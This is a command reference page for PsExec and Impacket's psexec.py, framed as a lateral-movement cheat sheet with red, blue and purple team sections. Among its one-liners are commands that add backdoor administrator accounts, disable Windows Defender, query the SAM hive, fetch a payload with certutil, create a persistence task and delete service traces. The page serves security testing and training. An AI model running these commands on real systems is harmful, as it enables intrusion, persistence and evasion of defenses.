# PsExec

> Running commands on remote Windows hosts via the Service Control Manager — Sysinternals PsExec and Impacket’s psexec.py.

- Category: Lateral Movement
- Commands: 55
- Page: https://terminal.rokibulroni.com/tool/lateral/psexec
- Homepage: https://learn.microsoft.com/sysinternals/downloads/psexec
- Documentation: https://github.com/fortra/impacket
- Tags: remote execution, SMB, Windows

## Install

- apt: `sudo apt install python3-impacket`
- pipx: `pipx install impacket`

## Basic Remote Execution

### psexec \\192.168.1.10 cmd

```bash
psexec \\192.168.1.10 cmd
```

Executes an interactive command prompt on the target system using current credentials.

### psexec \\192.168.1.10 ipconfig /all

```bash
psexec \\192.168.1.10 ipconfig /all
```

Runs a single non-interactive command remotely and displays the output locally.


## Authentication Handling

### psexec \\192.168.1.10 -u Administrator -p Password123 cmd

```bash
psexec \\192.168.1.10 -u Administrator -p Password123 cmd
```

Connects to the remote host using explicit plaintext credentials.

### psexec \\192.168.1.10 -u DOMAIN\User -p Password123 cmd

```bash
psexec \\192.168.1.10 -u DOMAIN\User -p Password123 cmd
```

Example:

```bash
psexec \\192.168.1.10 -u CORP\Admin -p SecurePass! cmd
```

Connects using domain credentials for authentication.


## Automation

### psexec -accepteula \\192.168.1.10 cmd

```bash
psexec -accepteula \\192.168.1.10 cmd
```

Automatically accepts the Sysinternals EULA to prevent interactive pop-ups during automation.


## Privilege Escalation

### psexec \\192.168.1.10 -s cmd

```bash
psexec \\192.168.1.10 -s cmd
```

Runs the remote command shell under the NT AUTHORITY\SYSTEM account.


## Interactive Sessions

### psexec \\192.168.1.10 -i cmd

```bash
psexec \\192.168.1.10 -i cmd
```

Runs the program so that it interacts with the desktop of the specified session on the remote system.

### psexec \\192.168.1.10 -i -s cmd

```bash
psexec \\192.168.1.10 -i -s cmd
```

Launches an interactive command prompt as the SYSTEM account, visible on the remote desktop.

### psexec \\192.168.1.10 -i 2 cmd

```bash
psexec \\192.168.1.10 -i 2 cmd
```

Executes the command specifically on session ID 2 on the remote machine.


## File Execution

### psexec \\192.168.1.10 -c test.exe

```bash
psexec \\192.168.1.10 -c test.exe
```

Example:

```bash
psexec \\192.168.1.10 -c C:\Tools\payload.exe
```

Copies the specified executable to the remote system and runs it.

### psexec \\192.168.1.10 -c -f test.exe

```bash
psexec \\192.168.1.10 -c -f test.exe
```

Example:

```bash
psexec \\192.168.1.10 -c -f C:\Tools\payload.exe
```

Forces the copy of the executable to the remote system even if the file already exists.

### psexec \\192.168.1.10 -c -v test.exe

```bash
psexec \\192.168.1.10 -c -v test.exe
```

Example:

```bash
psexec \\192.168.1.10 -c -v C:\Tools\payload.exe
```

Copies the file only if the local version has a higher version number or is newer.


## Performance Control

### psexec \\192.168.1.10 -d cmd

```bash
psexec \\192.168.1.10 -d cmd
```

Example:

```bash
psexec \\192.168.1.10 -d C:\Windows\System32\calc.exe
```

Runs the process non-interactively and does not wait for it to terminate.


## Priority Management

### psexec \\192.168.1.10 -low cmd

```bash
psexec \\192.168.1.10 -low cmd
```

Example:

```bash
psexec \\192.168.1.10 -low batch_job.bat
```

Starts the remote process with Low priority.

### psexec \\192.168.1.10 -high cmd

```bash
psexec \\192.168.1.10 -high cmd
```

Example:

```bash
psexec \\192.168.1.10 -high critical_task.exe
```

Starts the remote process with High priority.


## Environment Control

### psexec \\192.168.1.10 -w C:\Temp cmd

```bash
psexec \\192.168.1.10 -w C:\Temp cmd
```

Example:

```bash
psexec \\192.168.1.10 -w C:\Windows\Temp cmd /c dir
```

Sets the working directory of the process on the remote system.

### psexec \\192.168.1.10 -e cmd

```bash
psexec \\192.168.1.10 -e cmd
```

Does not load the specified user's profile during execution.


## Security Context

### psexec \\192.168.1.10 -l cmd

```bash
psexec \\192.168.1.10 -l cmd
```

Runs the process with Limited User rights (strips administrators group token).


## Connection Configuration

### psexec \\192.168.1.10 -n 10 cmd

```bash
psexec \\192.168.1.10 -n 10 cmd
```

Sets a connection timeout of 10 seconds for connecting to the remote machine.


## Service Customization

### psexec \\192.168.1.10 -r MyService cmd

```bash
psexec \\192.168.1.10 -r MyService cmd
```

Example:

```bash
psexec \\192.168.1.10 -r LatMovSvc cmd
```

Specifies a custom name for the remote service created by PsExec (default is PSEXESVC).


## Lateral Movement Simulation

### psexec \\192.168.1.10 -s net user

```bash
psexec \\192.168.1.10 -s net user
```

Enumerates local users on the target as SYSTEM, simulating reconnaissance.

### psexec \\192.168.1.10 -s reg query HKLM\SAM

```bash
psexec \\192.168.1.10 -s reg query HKLM\SAM
```

Attempts to query sensitive registry hives remotely as SYSTEM.

### psexec \\192.168.1.10 -s powershell -NoP -Command "whoami"

```bash
psexec \\192.168.1.10 -s powershell -NoP -Command "whoami"
```

Executes PowerShell commands remotely as SYSTEM without loading a profile.


## Multi-Host Targeting

### psexec @hosts.txt cmd

```bash
psexec @hosts.txt cmd
```

Example:

```bash
psexec @C:\Ops\targets.txt ipconfig
```

Executes the command on every host listed in the specified text file.

### psexec \\* cmd

```bash
psexec \\* cmd
```

Example:

```bash
psexec \\* cmd /c echo check
```

Runs the command on all computers in the current domain.


## Logging and Redirection

### psexec \\192.168.1.10 cmd > output.txt

```bash
psexec \\192.168.1.10 cmd > output.txt
```

Example:

```bash
psexec \\192.168.1.10 ipconfig > C:\Logs\remote_ip.txt
```

Redirects the standard output of the remote command to a local file.

### psexec \\192.168.1.10 cmd 2> error.txt

```bash
psexec \\192.168.1.10 cmd 2> error.txt
```

Example:

```bash
psexec \\192.168.1.10 script.bat 2> C:\Logs\errors.log
```

Redirects the standard error of the remote command to a local file.


## Blue Team Testing

### psexec -s \\192.168.1.10 certutil -urlcache -split -f http://example.com/file

```bash
psexec -s \\192.168.1.10 certutil -urlcache -split -f http://example.com/file
```

Example:

```bash
psexec -s \\192.168.1.10 certutil -urlcache -split -f http://192.168.1.5/payload
```

Simulates ingress tool transfer behavior using certutil via PsExec.

### psexec \\192.168.1.10 -h cmd

```bash
psexec \\192.168.1.10 -h cmd
```

Runs the process with the account's elevated token (if available).


## Process Isolation

### psexec \\192.168.1.10 -x cmd

```bash
psexec \\192.168.1.10 -x cmd
```

Displays the UI on the Winlogon secure desktop (system only).


## Processor Affinity

### psexec \\192.168.1.10 -a 1 cmd

```bash
psexec \\192.168.1.10 -a 1 cmd
```

Example:

```bash
psexec \\192.168.1.10 -a 1 stress_test.exe
```

Forces the process to run on specific processors (CPU affinity).


## Advanced Workflow

### psexec \\192.168.1.10 -u Admin -p Pass -h -d -c payload.bat

```bash
psexec \\192.168.1.10 -u Admin -p Pass -h -d -c payload.bat
```

Example:

```bash
psexec \\192.168.1.10 -u Admin -p Pass -h -d -c setup.bat
```

Copies a script, executes it elevated, detached, using explicit credentials.

### psexec \\192.168.1.10 -s -i -d cmd /c "echo owned > C:\flag.txt"

```bash
psexec \\192.168.1.10 -s -i -d cmd /c "echo owned > C:\flag.txt"
```

Example:

```bash
psexec \\192.168.1.10 -s -i -d cmd /c "echo test > C:\Windows\Temp\check.txt"
```

Non-blocking execution of a one-liner as SYSTEM to create a file artifact.


## Detection Testing

### psexec -r CustomSvcName \\192.168.1.10 cmd

```bash
psexec -r CustomSvcName \\192.168.1.10 cmd
```

Example:

```bash
psexec -r EvilService \\192.168.1.10 cmd
```

Changes the service name to test if detection rules alert on non-standard PSEXESVC names.


## Interactive GUI Test

### psexec -s -i 1 \\192.168.1.10 notepad.exe

```bash
psexec -s -i 1 \\192.168.1.10 notepad.exe
```

Launches a GUI application (Notepad) on the user's desktop session as SYSTEM.


## Batch Execution

### psexec @servers.txt -u Domain\Admin -p Pass -d -n 5 cmd /c hostname

```bash
psexec @servers.txt -u Domain\Admin -p Pass -d -n 5 cmd /c hostname
```

Example:

```bash
psexec @list.txt -u Corp\Admin -p Pass -d -n 5 cmd /c hostname
```

Rapidly fires a hostname check across a list of servers with a short timeout and detach mode.


## Network Testing

### psexec \\192.168.1.10 ipconfig /flushdns

```bash
psexec \\192.168.1.10 ipconfig /flushdns
```

Remotely flushes the DNS cache on the target system.


## Incident Response

### psexec \\192.168.1.10 tasklist

```bash
psexec \\192.168.1.10 tasklist
```

Retrieves the list of running processes from the remote host for analysis.

### psexec \\192.168.1.10 netstat -anob

```bash
psexec \\192.168.1.10 netstat -anob
```

Retrieves active network connections and associated binaries from the remote host.

### psexec -s \\192.168.1.10 wmic qfe list

```bash
psexec -s \\192.168.1.10 wmic qfe list
```

Lists installed patches and hotfixes on the remote host as SYSTEM.


## Red Team Ops

### psexec -s \\192.168.1.10 cmd /c "net user hacker P@ssw0rd123 /add && net localgroup administrators hacker /add"

```bash
psexec -s \\192.168.1.10 cmd /c "net user hacker P@ssw0rd123 /add && net localgroup administrators hacker /add"
```

Example:

```bash
psexec -s \\192.168.1.10 cmd /c "net user backdoor P@ssw0rd123 /add"
```

Simulates persistence creation by adding a backdoor user via a single command line.

### psexec -s \\192.168.1.10 powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

```bash
psexec -s \\192.168.1.10 powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
```

Simulates disabling Windows Defender real-time monitoring remotely.


## Force Disconnect

### psexec \\192.168.1.10 -f cmd

```bash
psexec \\192.168.1.10 -f cmd
```

Uses the force flag if the program is already running (rarely used for cmd, useful for services).


## Complex Chaining

### psexec \\192.168.1.10 -u User -p Pass cmd /c "ping 127.0.0.1 -n 5 > nul && whoami"

```bash
psexec \\192.168.1.10 -u User -p Pass cmd /c "ping 127.0.0.1 -n 5 > nul && whoami"
```

executes a delayed command sequence to test timeout handling and output buffering.


## Purple Team Validation

### psexec \\192.168.1.10 -c -f -s PsExec.exe

```bash
psexec \\192.168.1.10 -c -f -s PsExec.exe
```

Copies PsExec itself to the target to simulate nested lateral movement (PsExec via PsExec).


## Credential Testing

### psexec \\192.168.1.10 -u "" -p "" cmd

```bash
psexec \\192.168.1.10 -u "" -p "" cmd
```

Attempts to connect using a null session or existing implicit token.


## Cleanup Simulation

### psexec \\192.168.1.10 cmd /c "sc delete PSEXESVC"

```bash
psexec \\192.168.1.10 cmd /c "sc delete PSEXESVC"
```

Manually attempts to delete the PsExec service to simulate trace removal.


## Cross-Domain

### psexec \\192.168.1.10 -u TARGETDOMAIN\Administrator -p Password cmd

```bash
psexec \\192.168.1.10 -u TARGETDOMAIN\Administrator -p Password cmd
```

Example:

```bash
psexec \\192.168.1.10 -u OTHER\Admin -p Pass cmd
```

Executes commands using credentials from a different trust domain.


## Load Profile

### psexec \\192.168.1.10 -i -u User -p Pass -e cmd

```bash
psexec \\192.168.1.10 -i -u User -p Pass -e cmd
```

Explicitly avoids loading the user profile while running interactively.


## Blue Team Alerting

### psexec \\192.168.1.10 powershell -enc JABiACAAPQAgADEAMgAzAA==

```bash
psexec \\192.168.1.10 powershell -enc JABiACAAPQAgADEAMgAzAA==
```

Runs encoded PowerShell commands remotely to trigger obfuscation detection rules.


## Environment Variables

### psexec \\192.168.1.10 cmd /c "set"

```bash
psexec \\192.168.1.10 cmd /c "set"
```

Dumps remote environment variables to verify the execution context.


## Registry Modification

### psexec -s \\192.168.1.10 reg add HKLM\Software\Test /v Data /t REG_SZ /d "Lateral" /f

```bash
psexec -s \\192.168.1.10 reg add HKLM\Software\Test /v Data /t REG_SZ /d "Lateral" /f
```

Adds a registry key remotely as SYSTEM to test EDR registry monitoring.


## Scheduled Task Simulation

### psexec \\192.168.1.10 schtasks /create /tn "EvilTask" /tr calc.exe /sc once /st 00:00

```bash
psexec \\192.168.1.10 schtasks /create /tn "EvilTask" /tr calc.exe /sc once /st 00:00
```

Uses PsExec to remotely create a scheduled task, a common persistence technique.


## Account Discovery

### psexec \\192.168.1.10 net localgroup administrators

```bash
psexec \\192.168.1.10 net localgroup administrators
```

Queries the local administrators group on the remote host.


## Share Access

### psexec \\192.168.1.10 cmd /c "dir \\127.0.0.1\C$"

```bash
psexec \\192.168.1.10 cmd /c "dir \\127.0.0.1\C$"
```

Verifies access to administrative shares (C$) from the remote execution context.

## Related tools

- [smbexec](https://terminal.rokibulroni.com/tool/lateral/smbexec)
- [wmiexec](https://terminal.rokibulroni.com/tool/lateral/wmiexec)
- [CrackMapExec / NetExec](https://terminal.rokibulroni.com/tool/lateral/crackmapexec)
